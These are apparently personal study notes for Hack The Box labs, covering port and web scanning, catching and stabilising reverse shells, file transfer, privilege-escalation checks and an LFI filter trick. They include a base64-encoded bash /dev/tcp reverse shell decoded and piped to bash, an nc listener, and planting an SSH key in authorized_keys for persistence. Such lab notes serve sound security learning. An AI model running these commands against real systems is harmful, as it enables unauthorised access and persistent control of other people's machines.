# HTB Starter Notes
- `nmap -sC -sV {ip}`
	- simple starter scan
	- after this scan, scanning more ports is good
		- `nmap -sU -top-ports=100 -T5 {ip}`
	- also trying --script=vulners might help
	- also try `nmap -sV -sC -sT -p- --min-rate 5000 {ip}`

- `wpscan -e ap,t,tt,u --url {url}`
	- tool to use for wordpress enum

- `nikto -h {ip}` 
	- command line vuln scanner, nice to just casually run

- `nc -lvnp 9001`
	- for reverse shell

-  `python3 -c 'import pty;pty.spawn("/bin/bash")'` 
	- used after getting a reverse shell
- then hit `control + z`  and run the command `stty raw -echo; fg`   
	- on the host machine
-  `export TERM=xterm`  
	- something about clearing the screen on the reverse shell you now have
- on a new tab on the base machine `stty -a`
	- note the rows and columns number
- back on reverse shell: run `stty rows {number} cols {number}`
	- use the rows and columns from the previous command
		- 42 rows 190 columns on parrot

- `python3 -m http.server 8001` on host/machine with files
- then  `wget {ip}:8001/{filename}`   on box/machine to get files
	-  to get the files from one machine to another
	- use `--recursive` to get directories or multiple files

- /dev/shm
	- I think this is writing files to be stored in RAM
	-  possibly a defense evasion tactic
	- interesting place to work out of 

- https://github.com/infodox/python-pty-shells
	- A bunch of python reverse shells as well as a shell handler
	- The shell handler seems better than normal nc 
	- Probably not better than ssh but interesting idea

-  `echo -n 'bash -i >& /dev/tcp/{ip}:9001 0>&1' | base64 -w 0`  
	- generate the reverse shell after getting rid of the special characters in the base64 (put spaces where there are + and = signs)
-  `nc -lvnp 9001` 
	- run on host to catch the reverse shell
- `echo -n {base 64 generated above} | base64 -d | bash` 
	- run on the box to get the shell

- https://gtfobins.github.io/ 
	- good source for finding priv escalation ideas

- Process to convert from an unstable reverse shell to ssh
	- run `cd ~`  to get the user's home dir
	- `mkdir .ssh`  and `cd .ssh/`  to make and move to the new ssh directory
	- then on Parrot/base run  `ssh-keygen -f {name}` and hit enter a few time
		- name should be the name of the machine but it doesn't matter as long as it is consistent throughout
	- then copy the public key (ends with .pub) probably best to just `cat` then copy paste
	- move back to the target/htb and paste/move the pub key to a file named `authorized_keys`  probably best to use `nano authorized_keys`
		- alternative is `echo {key} > authorized_keys`
	- maybe not needed, use `chmod 600 {name}` on Parrot/base
	- then run `ssh -i {name} {username}@{ip address of htb}` on Parrot/base to connect

- public companies have a 10k file
	- has lots of interesting info in it for onsite pentests but also maybe some for online

- look into using cobalt strike some

- Cain and Abel
- Mimikatz
	- windows post exploitation tools?

- https://www.revshells.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
	- good places to look for some basic reverse shells

- learn more about private/public keys
	- rsa encryption
	- how to use it for ssh
	- how to use commands relating to it linux

- use `sudo -l` to check perms for things

- `php://filter/convert.base64-encode/resource=index` 
	- LFI filter work around 
	- https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

- snmpwalk
	- https://net-snmp.sourceforge.io/docs/man/snmpwalk.html 
	- snmp enumeration
	- udp port 161

- pspy
	- https://github.com/DominicBreuker/pspy 
	- way to watch for creds being passed on linux
	- process snooping without needing root

- https://medium.com/codex/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell-255a71fcf2a0
	- some privilege escalation tactics
	- check for SUID binaries to run as root and esc privs
		- `find / -type f -perm -u=s 2>/dev/null`
		- use https://gtfobins.github.io/ to see if you can get a root shell as it
	- `sudo -l` to check privs (another note about it above)
	- `cat /etc/crontab` to check for cronjobs that can be exploited
		- look for scripts that are ran that you can edit/manipulate

 - feroxbuster
	 - cool version of gobuster or other directory scanning tools 
	 - `feroxbuster -f --url {url}`
	 - `--dont-scan` to exclude urls

- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
	- Guide on how to escape restricted shells
	- 

- things to look into:
	- read later: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf 
	- 
